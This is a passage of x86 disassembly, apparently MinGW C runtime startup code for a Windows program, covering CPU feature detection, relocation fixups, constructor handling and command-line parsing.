  402633:	53                   	push   %ebx
  402634:	83 ec 14             	sub    $0x14,%esp
  402637:	8b 15 6c 11 41 00    	mov    0x41116c,%edx
  40263d:	8b 45 0c             	mov    0xc(%ebp),%eax
  402640:	83 3a 03             	cmpl   $0x3,(%edx)
  402643:	76 31                	jbe    0x402676
  402645:	83 3d 34 00 41 00 02 	cmpl   $0x2,0x410034
  40264c:	74 0a                	je     0x402658
  40264e:	c7 05 34 00 41 00 02 	movl   $0x2,0x410034
  402655:	00 00 00 
  402658:	83 f8 02             	cmp    $0x2,%eax
  40265b:	0f 84 05 01 00 00    	je     0x402766
  402661:	83 f8 01             	cmp    $0x1,%eax
  402664:	0f 84 9e 00 00 00    	je     0x402708
  40266a:	b8 01 00 00 00       	mov    $0x1,%eax
  40266f:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  402672:	c9                   	leave
  402673:	c2 0c 00             	ret    $0xc
  402676:	c7 05 7c 00 41 00 01 	movl   $0x1,0x41007c
  40267d:	00 00 00 
  402680:	c7 04 24 b4 f2 40 00 	movl   $0x40f2b4,(%esp)
  402687:	e8 5c 09 00 00       	call   0x402fe8
  40268c:	83 ec 04             	sub    $0x4,%esp
  40268f:	85 c0                	test   %eax,%eax
  402691:	a3 20 00 41 00       	mov    %eax,0x410020
  402696:	0f 84 fa 00 00 00    	je     0x402796
  40269c:	c7 44 24 04 c1 f2 40 	movl   $0x40f2c1,0x4(%esp)
  4026a3:	00 
  4026a4:	89 04 24             	mov    %eax,(%esp)
  4026a7:	e8 2c 09 00 00       	call   0x402fd8
  4026ac:	a3 6c 00 41 00       	mov    %eax,0x41006c
  4026b1:	a1 20 00 41 00       	mov    0x410020,%eax
  4026b6:	83 ec 08             	sub    $0x8,%esp
  4026b9:	c7 44 24 04 dc f2 40 	movl   $0x40f2dc,0x4(%esp)
  4026c0:	00 
  4026c1:	89 04 24             	mov    %eax,(%esp)
  4026c4:	e8 0f 09 00 00       	call   0x402fd8
  4026c9:	a3 5c 00 41 00       	mov    %eax,0x41005c
  4026ce:	a1 20 00 41 00       	mov    0x410020,%eax
  4026d3:	83 ec 08             	sub    $0x8,%esp
  4026d6:	85 c0                	test   %eax,%eax
  4026d8:	0f 84 b8 00 00 00    	je     0x402796
  4026de:	8b 0d 6c 00 41 00    	mov    0x41006c,%ecx
  4026e4:	85 c9                	test   %ecx,%ecx
  4026e6:	74 3f                	je     0x402727
  4026e8:	8b 15 5c 00 41 00    	mov    0x41005c,%edx
  4026ee:	85 d2                	test   %edx,%edx
  4026f0:	74 35                	je     0x402727
  4026f2:	c7 05 34 00 41 00 01 	movl   $0x1,0x410034
  4026f9:	00 00 00 
  4026fc:	b8 01 00 00 00       	mov    $0x1,%eax
  402701:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  402704:	c9                   	leave
  402705:	c2 0c 00             	ret    $0xc
  402708:	8b 45 10             	mov    0x10(%ebp),%eax
  40270b:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  402712:	00 
  402713:	89 44 24 08          	mov    %eax,0x8(%esp)
  402717:	8b 45 08             	mov    0x8(%ebp),%eax
  40271a:	89 04 24             	mov    %eax,(%esp)
  40271d:	e8 8e 06 00 00       	call   0x402db0
  402722:	e9 43 ff ff ff       	jmp    0x40266a
  402727:	c7 05 5c 00 41 00 00 	movl   $0x0,0x41005c
  40272e:	00 00 00 
  402731:	c7 05 6c 00 41 00 00 	movl   $0x0,0x41006c
  402738:	00 00 00 
  40273b:	89 04 24             	mov    %eax,(%esp)
  40273e:	e8 c5 08 00 00       	call   0x403008
  402743:	83 ec 04             	sub    $0x4,%esp
  402746:	c7 05 20 00 41 00 00 	movl   $0x0,0x410020
  40274d:	00 00 00 
  402750:	b8 01 00 00 00       	mov    $0x1,%eax
  402755:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  402758:	c7 05 34 00 41 00 00 	movl   $0x0,0x410034
  40275f:	00 00 00 
  402762:	c9                   	leave
  402763:	c2 0c 00             	ret    $0xc
  402766:	bb 14 20 41 00       	mov    $0x412014,%ebx
  40276b:	81 fb 14 20 41 00    	cmp    $0x412014,%ebx
  402771:	0f 84 f3 fe ff ff    	je     0x40266a
  402777:	8b 03                	mov    (%ebx),%eax
  402779:	85 c0                	test   %eax,%eax
  40277b:	74 02                	je     0x40277f
  40277d:	ff d0                	call   *%eax
  40277f:	83 c3 04             	add    $0x4,%ebx
  402782:	81 fb 14 20 41 00    	cmp    $0x412014,%ebx
  402788:	75 ed                	jne    0x402777
  40278a:	b8 01 00 00 00       	mov    $0x1,%eax
  40278f:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  402792:	c9                   	leave
  402793:	c2 0c 00             	ret    $0xc
  402796:	c7 05 5c 00 41 00 00 	movl   $0x0,0x41005c
  40279d:	00 00 00 
  4027a0:	c7 05 6c 00 41 00 00 	movl   $0x0,0x41006c
  4027a7:	00 00 00 
  4027aa:	eb 9a                	jmp    0x402746
  4027ac:	90                   	nop
  4027ad:	90                   	nop
  4027ae:	90                   	nop
  4027af:	90                   	nop
  4027b0:	55                   	push   %ebp
  4027b1:	89 e5                	mov    %esp,%ebp
  4027b3:	53                   	push   %ebx
  4027b4:	9c                   	pushf
  4027b5:	9c                   	pushf
  4027b6:	58                   	pop    %eax
  4027b7:	89 c2                	mov    %eax,%edx
  4027b9:	35 00 00 20 00       	xor    $0x200000,%eax
  4027be:	50                   	push   %eax
  4027bf:	9d                   	popf
  4027c0:	9c                   	pushf
  4027c1:	58                   	pop    %eax
  4027c2:	9d                   	popf
  4027c3:	31 d0                	xor    %edx,%eax
  4027c5:	a9 00 00 20 00       	test   $0x200000,%eax
  4027ca:	0f 84 a3 00 00 00    	je     0x402873
  4027d0:	31 c0                	xor    %eax,%eax
  4027d2:	0f a2                	cpuid
  4027d4:	85 c0                	test   %eax,%eax
  4027d6:	0f 84 97 00 00 00    	je     0x402873
  4027dc:	b8 01 00 00 00       	mov    $0x1,%eax
  4027e1:	0f a2                	cpuid
  4027e3:	f6 c6 01             	test   $0x1,%dh
  4027e6:	74 07                	je     0x4027ef
  4027e8:	83 0d 28 00 41 00 01 	orl    $0x1,0x410028
  4027ef:	66 85 d2             	test   %dx,%dx
  4027f2:	79 07                	jns    0x4027fb
  4027f4:	83 0d 28 00 41 00 02 	orl    $0x2,0x410028
  4027fb:	f7 c2 00 00 80 00    	test   $0x800000,%edx
  402801:	74 07                	je     0x40280a
  402803:	83 0d 28 00 41 00 04 	orl    $0x4,0x410028
  40280a:	f7 c2 00 00 00 01    	test   $0x1000000,%edx
  402810:	74 07                	je     0x402819
  402812:	83 0d 28 00 41 00 08 	orl    $0x8,0x410028
  402819:	f7 c2 00 00 00 02    	test   $0x2000000,%edx
  40281f:	74 07                	je     0x402828
  402821:	83 0d 28 00 41 00 10 	orl    $0x10,0x410028
  402828:	81 e2 00 00 00 04    	and    $0x4000000,%edx
  40282e:	74 07                	je     0x402837
  402830:	83 0d 28 00 41 00 20 	orl    $0x20,0x410028
  402837:	f6 c1 01             	test   $0x1,%cl
  40283a:	74 07                	je     0x402843
  40283c:	83 0d 28 00 41 00 40 	orl    $0x40,0x410028
  402843:	80 e5 20             	and    $0x20,%ch
  402846:	75 2e                	jne    0x402876
  402848:	b8 00 00 00 80       	mov    $0x80000000,%eax
  40284d:	0f a2                	cpuid
  40284f:	3d 00 00 00 80       	cmp    $0x80000000,%eax
  402854:	76 1d                	jbe    0x402873
  402856:	b8 01 00 00 80       	mov    $0x80000001,%eax
  40285b:	0f a2                	cpuid
  40285d:	85 d2                	test   %edx,%edx
  40285f:	78 21                	js     0x402882
  402861:	81 e2 00 00 00 40    	and    $0x40000000,%edx
  402867:	74 0a                	je     0x402873
  402869:	81 0d 28 00 41 00 00 	orl    $0x200,0x410028
  402870:	02 00 00 
  402873:	5b                   	pop    %ebx
  402874:	5d                   	pop    %ebp
  402875:	c3                   	ret
  402876:	81 0d 28 00 41 00 80 	orl    $0x80,0x410028
  40287d:	00 00 00 
  402880:	eb c6                	jmp    0x402848
  402882:	81 0d 28 00 41 00 00 	orl    $0x100,0x410028
  402889:	01 00 00 
  40288c:	eb d3                	jmp    0x402861
  40288e:	90                   	nop
  40288f:	90                   	nop
  402890:	55                   	push   %ebp
  402891:	89 e5                	mov    %esp,%ebp
  402893:	83 ec 18             	sub    $0x18,%esp
  402896:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  402899:	8b 1d 60 11 41 00    	mov    0x411160,%ebx
  40289f:	89 75 fc             	mov    %esi,-0x4(%ebp)
  4028a2:	8d 75 0c             	lea    0xc(%ebp),%esi
  4028a5:	c7 44 24 08 17 00 00 	movl   $0x17,0x8(%esp)
  4028ac:	00 
  4028ad:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  4028b4:	00 
  4028b5:	83 c3 40             	add    $0x40,%ebx
  4028b8:	89 5c 24 0c          	mov    %ebx,0xc(%esp)
  4028bc:	c7 04 24 f4 f2 40 00 	movl   $0x40f2f4,(%esp)
  4028c3:	e8 d0 06 00 00       	call   0x402f98
  4028c8:	8b 45 08             	mov    0x8(%ebp),%eax
  4028cb:	89 74 24 08          	mov    %esi,0x8(%esp)
  4028cf:	89 1c 24             	mov    %ebx,(%esp)
  4028d2:	89 44 24 04          	mov    %eax,0x4(%esp)
  4028d6:	e8 c5 06 00 00       	call   0x402fa0
  4028db:	e8 c8 06 00 00       	call   0x402fa8
  4028e0:	55                   	push   %ebp
  4028e1:	89 e5                	mov    %esp,%ebp
  4028e3:	83 ec 48             	sub    $0x48,%esp
  4028e6:	85 c9                	test   %ecx,%ecx
  4028e8:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  4028eb:	89 c3                	mov    %eax,%ebx
  4028ed:	89 75 f8             	mov    %esi,-0x8(%ebp)
  4028f0:	89 d6                	mov    %edx,%esi
  4028f2:	89 7d fc             	mov    %edi,-0x4(%ebp)
  4028f5:	89 cf                	mov    %ecx,%edi
  4028f7:	75 0d                	jne    0x402906
  4028f9:	8b 5d f4             	mov    -0xc(%ebp),%ebx
  4028fc:	8b 75 f8             	mov    -0x8(%ebp),%esi
  4028ff:	8b 7d fc             	mov    -0x4(%ebp),%edi
  402902:	89 ec                	mov    %ebp,%esp
  402904:	5d                   	pop    %ebp
  402905:	c3                   	ret
  402906:	8d 45 c8             	lea    -0x38(%ebp),%eax
  402909:	c7 44 24 08 1c 00 00 	movl   $0x1c,0x8(%esp)
  402910:	00 
  402911:	89 44 24 04          	mov    %eax,0x4(%esp)
  402915:	89 1c 24             	mov    %ebx,(%esp)
  402918:	e8 0b 07 00 00       	call   0x403028
  40291d:	83 ec 0c             	sub    $0xc,%esp
  402920:	85 c0                	test   %eax,%eax
  402922:	0f 84 83 00 00 00    	je     0x4029ab
  402928:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40292b:	83 f8 04             	cmp    $0x4,%eax
  40292e:	75 50                	jne    0x402980
  402930:	89 7c 24 08          	mov    %edi,0x8(%esp)
  402934:	89 74 24 04          	mov    %esi,0x4(%esp)
  402938:	89 1c 24             	mov    %ebx,(%esp)
  40293b:	e8 48 06 00 00       	call   0x402f88
  402940:	8b 45 dc             	mov    -0x24(%ebp),%eax
  402943:	83 f8 04             	cmp    $0x4,%eax
  402946:	74 b1                	je     0x4028f9
  402948:	83 f8 40             	cmp    $0x40,%eax
  40294b:	74 ac                	je     0x4028f9
  40294d:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  402950:	89 44 24 0c          	mov    %eax,0xc(%esp)
  402954:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402957:	89 44 24 08          	mov    %eax,0x8(%esp)
  40295b:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40295e:	89 44 24 04          	mov    %eax,0x4(%esp)
  402962:	8b 45 c8             	mov    -0x38(%ebp),%eax
  402965:	89 04 24             	mov    %eax,(%esp)
  402968:	e8 73 06 00 00       	call   0x402fe0
  40296d:	8b 5d f4             	mov    -0xc(%ebp),%ebx
  402970:	8b 75 f8             	mov    -0x8(%ebp),%esi
  402973:	8b 7d fc             	mov    -0x4(%ebp),%edi
  402976:	83 ec 10             	sub    $0x10,%esp
  402979:	89 ec                	mov    %ebp,%esp
  40297b:	5d                   	pop    %ebp
  40297c:	c3                   	ret
  40297d:	8d 76 00             	lea    0x0(%esi),%esi
  402980:	83 f8 40             	cmp    $0x40,%eax
  402983:	74 ab                	je     0x402930
  402985:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  402988:	89 44 24 0c          	mov    %eax,0xc(%esp)
  40298c:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40298f:	c7 44 24 08 40 00 00 	movl   $0x40,0x8(%esp)
  402996:	00 
  402997:	89 44 24 04          	mov    %eax,0x4(%esp)
  40299b:	8b 45 c8             	mov    -0x38(%ebp),%eax
  40299e:	89 04 24             	mov    %eax,(%esp)
  4029a1:	e8 3a 06 00 00       	call   0x402fe0
  4029a6:	83 ec 10             	sub    $0x10,%esp
  4029a9:	eb 85                	jmp    0x402930
  4029ab:	89 5c 24 08          	mov    %ebx,0x8(%esp)
  4029af:	c7 44 24 04 1c 00 00 	movl   $0x1c,0x4(%esp)
  4029b6:	00 
  4029b7:	c7 04 24 0c f3 40 00 	movl   $0x40f30c,(%esp)
  4029be:	e8 cd fe ff ff       	call   0x402890
  4029c3:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4029c9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4029d0:	55                   	push   %ebp
  4029d1:	89 e5                	mov    %esp,%ebp
  4029d3:	83 ec 38             	sub    $0x38,%esp
  4029d6:	a1 2c 00 41 00       	mov    0x41002c,%eax
  4029db:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  4029de:	89 75 f8             	mov    %esi,-0x8(%ebp)
  4029e1:	89 7d fc             	mov    %edi,-0x4(%ebp)
  4029e4:	85 c0                	test   %eax,%eax
  4029e6:	74 0d                	je     0x4029f5
  4029e8:	8b 5d f4             	mov    -0xc(%ebp),%ebx
  4029eb:	8b 75 f8             	mov    -0x8(%ebp),%esi
  4029ee:	8b 7d fc             	mov    -0x4(%ebp),%edi
  4029f1:	89 ec                	mov    %ebp,%esp
  4029f3:	5d                   	pop    %ebp
  4029f4:	c3                   	ret
  4029f5:	b8 00 00 41 00       	mov    $0x410000,%eax
  4029fa:	2d 00 00 41 00       	sub    $0x410000,%eax
  4029ff:	83 f8 07             	cmp    $0x7,%eax
  402a02:	c7 05 2c 00 41 00 01 	movl   $0x1,0x41002c
  402a09:	00 00 00 
  402a0c:	7e da                	jle    0x4029e8
  402a0e:	83 f8 0b             	cmp    $0xb,%eax
  402a11:	bb 00 00 41 00       	mov    $0x410000,%ebx
  402a16:	7e 28                	jle    0x402a40
  402a18:	8b 3d 00 00 41 00    	mov    0x410000,%edi
  402a1e:	85 ff                	test   %edi,%edi
  402a20:	75 1e                	jne    0x402a40
  402a22:	8b 35 04 00 41 00    	mov    0x410004,%esi
  402a28:	85 f6                	test   %esi,%esi
  402a2a:	75 14                	jne    0x402a40
  402a2c:	8b 0d 08 00 41 00    	mov    0x410008,%ecx
  402a32:	85 c9                	test   %ecx,%ecx
  402a34:	75 0a                	jne    0x402a40
  402a36:	bb 0c 00 41 00       	mov    $0x41000c,%ebx
  402a3b:	90                   	nop
  402a3c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  402a40:	8b 13                	mov    (%ebx),%edx
  402a42:	85 d2                	test   %edx,%edx
  402a44:	75 5c                	jne    0x402aa2
  402a46:	8b 43 04             	mov    0x4(%ebx),%eax
  402a49:	85 c0                	test   %eax,%eax
  402a4b:	75 55                	jne    0x402aa2
  402a4d:	8b 43 08             	mov    0x8(%ebx),%eax
  402a50:	83 f8 01             	cmp    $0x1,%eax
  402a53:	0f 85 16 01 00 00    	jne    0x402b6f
  402a59:	83 c3 0c             	add    $0xc,%ebx
  402a5c:	81 fb 00 00 41 00    	cmp    $0x410000,%ebx
  402a62:	73 84                	jae    0x4029e8
  402a64:	be 00 00 40 00       	mov    $0x400000,%esi
  402a69:	8b 43 04             	mov    0x4(%ebx),%eax
  402a6c:	8b 0b                	mov    (%ebx),%ecx
  402a6e:	0f b6 53 08          	movzbl 0x8(%ebx),%edx
  402a72:	01 f0                	add    %esi,%eax
  402a74:	01 f1                	add    %esi,%ecx
  402a76:	83 fa 10             	cmp    $0x10,%edx
  402a79:	8b 39                	mov    (%ecx),%edi
  402a7b:	74 69                	je     0x402ae6
  402a7d:	83 fa 20             	cmp    $0x20,%edx
  402a80:	0f 84 9d 00 00 00    	je     0x402b23
  402a86:	83 fa 08             	cmp    $0x8,%edx
  402a89:	74 7a                	je     0x402b05
  402a8b:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  402a92:	89 54 24 04          	mov    %edx,0x4(%esp)
  402a96:	c7 04 24 74 f3 40 00 	movl   $0x40f374,(%esp)
  402a9d:	e8 ee fd ff ff       	call   0x402890
  402aa2:	81 fb 00 00 41 00    	cmp    $0x410000,%ebx
  402aa8:	0f 83 3a ff ff ff    	jae    0x4029e8
  402aae:	be 00 00 40 00       	mov    $0x400000,%esi
  402ab3:	8d 7d e0             	lea    -0x20(%ebp),%edi
  402ab6:	8b 43 04             	mov    0x4(%ebx),%eax
  402ab9:	b9 04 00 00 00       	mov    $0x4,%ecx
  402abe:	01 f0                	add    %esi,%eax
  402ac0:	8b 10                	mov    (%eax),%edx
  402ac2:	03 13                	add    (%ebx),%edx
  402ac4:	83 c3 08             	add    $0x8,%ebx
  402ac7:	89 55 e0             	mov    %edx,-0x20(%ebp)
  402aca:	89 fa                	mov    %edi,%edx
  402acc:	e8 0f fe ff ff       	call   0x4028e0
  402ad1:	81 fb 00 00 41 00    	cmp    $0x410000,%ebx
  402ad7:	72 dd                	jb     0x402ab6
  402ad9:	8b 5d f4             	mov    -0xc(%ebp),%ebx
  402adc:	8b 75 f8             	mov    -0x8(%ebp),%esi
  402adf:	8b 7d fc             	mov    -0x4(%ebp),%edi
  402ae2:	89 ec                	mov    %ebp,%esp
  402ae4:	5d                   	pop    %ebp
  402ae5:	c3                   	ret
  402ae6:	0f b7 10             	movzwl (%eax),%edx
  402ae9:	66 85 d2             	test   %dx,%dx
  402aec:	78 72                	js     0x402b60
  402aee:	29 ca                	sub    %ecx,%edx
  402af0:	8d 3c 3a             	lea    (%edx,%edi,1),%edi
  402af3:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  402af6:	b9 02 00 00 00       	mov    $0x2,%ecx
  402afb:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  402afe:	e8 dd fd ff ff       	call   0x4028e0
  402b03:	eb 32                	jmp    0x402b37
  402b05:	0f b6 10             	movzbl (%eax),%edx
  402b08:	84 d2                	test   %dl,%dl
  402b0a:	78 44                	js     0x402b50
  402b0c:	29 ca                	sub    %ecx,%edx
  402b0e:	8d 3c 3a             	lea    (%edx,%edi,1),%edi
  402b11:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  402b14:	b9 01 00 00 00       	mov    $0x1,%ecx
  402b19:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  402b1c:	e8 bf fd ff ff       	call   0x4028e0
  402b21:	eb 14                	jmp    0x402b37
  402b23:	03 38                	add    (%eax),%edi
  402b25:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  402b28:	29 cf                	sub    %ecx,%edi
  402b2a:	b9 04 00 00 00       	mov    $0x4,%ecx
  402b2f:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  402b32:	e8 a9 fd ff ff       	call   0x4028e0
  402b37:	83 c3 0c             	add    $0xc,%ebx
  402b3a:	81 fb 00 00 41 00    	cmp    $0x410000,%ebx
  402b40:	0f 82 23 ff ff ff    	jb     0x402a69
  402b46:	e9 9d fe ff ff       	jmp    0x4029e8
  402b4b:	90                   	nop
  402b4c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  402b50:	81 ca 00 ff ff ff    	or     $0xffffff00,%edx
  402b56:	29 ca                	sub    %ecx,%edx
  402b58:	01 fa                	add    %edi,%edx
  402b5a:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  402b5d:	eb b5                	jmp    0x402b14
  402b5f:	90                   	nop
  402b60:	81 ca 00 00 ff ff    	or     $0xffff0000,%edx
  402b66:	29 ca                	sub    %ecx,%edx
  402b68:	01 fa                	add    %edi,%edx
  402b6a:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  402b6d:	eb 87                	jmp    0x402af6
  402b6f:	89 44 24 04          	mov    %eax,0x4(%esp)
  402b73:	c7 04 24 40 f3 40 00 	movl   $0x40f340,(%esp)
  402b7a:	e8 11 fd ff ff       	call   0x402890
  402b7f:	90                   	nop
  402b80:	55                   	push   %ebp
  402b81:	89 e5                	mov    %esp,%ebp
  402b83:	83 ec 08             	sub    $0x8,%esp
  402b86:	a1 78 f2 40 00       	mov    0x40f278,%eax
  402b8b:	8b 00                	mov    (%eax),%eax
  402b8d:	85 c0                	test   %eax,%eax
  402b8f:	74 17                	je     0x402ba8
  402b91:	ff d0                	call   *%eax
  402b93:	a1 78 f2 40 00       	mov    0x40f278,%eax
  402b98:	8d 50 04             	lea    0x4(%eax),%edx
  402b9b:	8b 40 04             	mov    0x4(%eax),%eax
  402b9e:	89 15 78 f2 40 00    	mov    %edx,0x40f278
  402ba4:	85 c0                	test   %eax,%eax
  402ba6:	75 e9                	jne    0x402b91
  402ba8:	c9                   	leave
  402ba9:	c3                   	ret
  402baa:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  402bb0:	55                   	push   %ebp
  402bb1:	89 e5                	mov    %esp,%ebp
  402bb3:	53                   	push   %ebx
  402bb4:	83 ec 14             	sub    $0x14,%esp
  402bb7:	8b 1d 90 30 40 00    	mov    0x403090,%ebx
  402bbd:	83 fb ff             	cmp    $0xffffffff,%ebx
  402bc0:	74 22                	je     0x402be4
  402bc2:	85 db                	test   %ebx,%ebx
  402bc4:	74 0c                	je     0x402bd2
  402bc6:	ff 14 9d 90 30 40 00 	call   *0x403090(,%ebx,4)
  402bcd:	83 eb 01             	sub    $0x1,%ebx
  402bd0:	75 f4                	jne    0x402bc6
  402bd2:	c7 04 24 80 2b 40 00 	movl   $0x402b80,(%esp)
  402bd9:	e8 22 e4 ff ff       	call   0x401000
  402bde:	83 c4 14             	add    $0x14,%esp
  402be1:	5b                   	pop    %ebx
  402be2:	5d                   	pop    %ebp
  402be3:	c3                   	ret
  402be4:	31 db                	xor    %ebx,%ebx
  402be6:	eb 02                	jmp    0x402bea
  402be8:	89 c3                	mov    %eax,%ebx
  402bea:	8d 43 01             	lea    0x1(%ebx),%eax
  402bed:	8b 14 85 90 30 40 00 	mov    0x403090(,%eax,4),%edx
  402bf4:	85 d2                	test   %edx,%edx
  402bf6:	75 f0                	jne    0x402be8
  402bf8:	eb c8                	jmp    0x402bc2
  402bfa:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  402c00:	55                   	push   %ebp
  402c01:	89 e5                	mov    %esp,%ebp
  402c03:	83 ec 08             	sub    $0x8,%esp
  402c06:	8b 0d 30 00 41 00    	mov    0x410030,%ecx
  402c0c:	85 c9                	test   %ecx,%ecx
  402c0e:	74 02                	je     0x402c12
  402c10:	c9                   	leave
  402c11:	c3                   	ret
  402c12:	c7 05 30 00 41 00 01 	movl   $0x1,0x410030
  402c19:	00 00 00 
  402c1c:	c9                   	leave
  402c1d:	eb 91                	jmp    0x402bb0
  402c1f:	90                   	nop
  402c20:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  402c24:	83 e4 f0             	and    $0xfffffff0,%esp
  402c27:	ff 71 fc             	push   -0x4(%ecx)
  402c2a:	55                   	push   %ebp
  402c2b:	89 e5                	mov    %esp,%ebp
  402c2d:	56                   	push   %esi
  402c2e:	53                   	push   %ebx
  402c2f:	51                   	push   %ecx
  402c30:	83 ec 6c             	sub    $0x6c,%esp
  402c33:	e8 c8 ff ff ff       	call   0x402c00
  402c38:	e8 f3 03 00 00       	call   0x403030
  402c3d:	89 c3                	mov    %eax,%ebx
  402c3f:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  402c42:	89 04 24             	mov    %eax,(%esp)
  402c45:	e8 ee 03 00 00       	call   0x403038
  402c4a:	83 ec 04             	sub    $0x4,%esp
  402c4d:	85 db                	test   %ebx,%ebx
  402c4f:	75 05                	jne    0x402c56
  402c51:	eb 53                	jmp    0x402ca6
  402c53:	83 c3 01             	add    $0x1,%ebx
  402c56:	0f b6 13             	movzbl (%ebx),%edx
  402c59:	80 fa 09             	cmp    $0x9,%dl
  402c5c:	74 f5                	je     0x402c53
  402c5e:	80 fa 20             	cmp    $0x20,%dl
  402c61:	74 f0                	je     0x402c53
  402c63:	80 fa 22             	cmp    $0x22,%dl
  402c66:	0f 84 84 00 00 00    	je     0x402cf0
  402c6c:	80 fa 09             	cmp    $0x9,%dl
  402c6f:	89 d0                	mov    %edx,%eax
  402c71:	74 21                	je     0x402c94
  402c73:	80 fa 20             	cmp    $0x20,%dl
  402c76:	74 20                	je     0x402c98
  402c78:	84 d2                	test   %dl,%dl
  402c7a:	75 0e                	jne    0x402c8a
  402c7c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  402c80:	eb 24                	jmp    0x402ca6
  402c82:	3c 20                	cmp    $0x20,%al
  402c84:	74 12                	je     0x402c98
  402c86:	84 c0                	test   %al,%al
  402c88:	74 1c                	je     0x402ca6
  402c8a:	83 c3 01             	add    $0x1,%ebx
  402c8d:	0f b6 03             	movzbl (%ebx),%eax
  402c90:	3c 09                	cmp    $0x9,%al
  402c92:	75 ee                	jne    0x402c82
  402c94:	3c 20                	cmp    $0x20,%al
  402c96:	75 72                	jne    0x402d0a
  402c98:	83 c3 01             	add    $0x1,%ebx
  402c9b:	0f b6 03             	movzbl (%ebx),%eax
  402c9e:	3c 09                	cmp    $0x9,%al
  402ca0:	74 f6                	je     0x402c98
  402ca2:	3c 20                	cmp    $0x20,%al
  402ca4:	74 f2                	je     0x402c98
  402ca6:	f6 45 d0 01          	testb  $0x1,-0x30(%ebp)
  402caa:	be 0a 00 00 00       	mov    $0xa,%esi
  402caf:	74 04                	je     0x402cb5
  402cb1:	0f b7 75 d4          	movzwl -0x2c(%ebp),%esi
  402cb5:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  402cbc:	e8 0f 03 00 00       	call   0x402fd0
  402cc1:	83 ec 04             	sub    $0x4,%esp
  402cc4:	89 74 24 0c          	mov    %esi,0xc(%esp)
  402cc8:	89 5c 24 08          	mov    %ebx,0x8(%esp)
  402ccc:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  402cd3:	00 
  402cd4:	89 04 24             	mov    %eax,(%esp)
  402cd7:	e8 d4 e7 ff ff       	call   0x4014b0
  402cdc:	83 ec 10             	sub    $0x10,%esp
  402cdf:	8d 65 f4             	lea    -0xc(%ebp),%esp
  402ce2:	59                   	pop    %ecx
  402ce3:	5b                   	pop    %ebx
  402ce4:	5e                   	pop    %esi
  402ce5:	5d                   	pop    %ebp
  402ce6:	8d 61 fc             	lea    -0x4(%ecx),%esp
  402ce9:	c3                   	ret
  402cea:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  402cf0:	83 c3 01             	add    $0x1,%ebx
  402cf3:	0f b6 03             	movzbl (%ebx),%eax
  402cf6:	84 c0                	test   %al,%al
  402cf8:	74 04                	je     0x402cfe
  402cfa:	3c 22                	cmp    $0x22,%al
  402cfc:	75 f2                	jne    0x402cf0
  402cfe:	3c 22                	cmp    $0x22,%al
  402d00:	75 92                	jne    0x402c94
  402d02:	83 c3 01             	add    $0x1,%ebx
  402d05:	0f b6 03             	movzbl (%ebx),%eax
  402d08:	eb 8a                	jmp    0x402c94
  402d0a:	3c 09                	cmp    $0x9,%al
  402d0c:	74 8a                	je     0x402c98
  402d0e:	66 90                	xchg   %ax,%ax
  402d10:	eb 94                	jmp    0x402ca6
  402d12:	90                   	nop
  402d13:	90                   	nop
  402d14:	90                   	nop
  402d15:	90                   	nop
  402d16:	90                   	nop
  402d17:	90                   	nop
  402d18:	90                   	nop
  402d19:	90                   	nop
  402d1a:	90                   	nop
  402d1b:	90                   	nop
  402d1c:	90                   	nop
  402d1d:	90                   	nop
  402d1e:	90                   	nop
  402d1f:	90                   	nop
  402d20:	55                   	push   %ebp
  402d21:	89 e5                	mov    %esp,%ebp
  402d23:	db e3                	fninit
  402d25:	5d                   	pop    %ebp
  402d26:	c3                   	ret
  402d27:	90                   	nop
  402d28:	90                   	nop
  402d29:	90                   	nop
  402d2a:	90                   	nop
  402d2b:	90                   	nop
  402d2c:	90                   	nop
  402d2d:	90                   	nop
  402d2e:	90                   	nop
  402d2f:	90                   	nop
  402d30:	55                   	push   %ebp
  402d31:	89 e5                	mov    %esp,%ebp
  402d33:	56                   	push   %esi
  402d34:	53                   	push   %ebx
  402d35:	83 ec 10             	sub    $0x10,%esp
  402d38:	a1 38 00 41 00       	mov    0x410038,%eax
  402d3d:	85 c0                	test   %eax,%eax
  402d3f:	75 07                	jne    0x402d48
  402d41:	8d 65 f8             	lea    -0x8(%ebp),%esp
  402d44:	5b                   	pop    %ebx
  402d45:	5e                   	pop    %esi
  402d46:	5d                   	pop    %ebp
  402d47:	c3                   	ret
  402d48:	c7 04 24 3c 00 41 00 	movl   $0x41003c,(%esp)
  402d4f:	e8 0c 03 00 00       	call   0x403060
  402d54:	8b 1d 54 00 41 00    	mov    0x410054,%ebx
  402d5a:	83 ec 04             	sub    $0x4,%esp
  402d5d:	85 db                	test   %ebx,%ebx
  402d5f:	74 2b                	je     0x402d8c
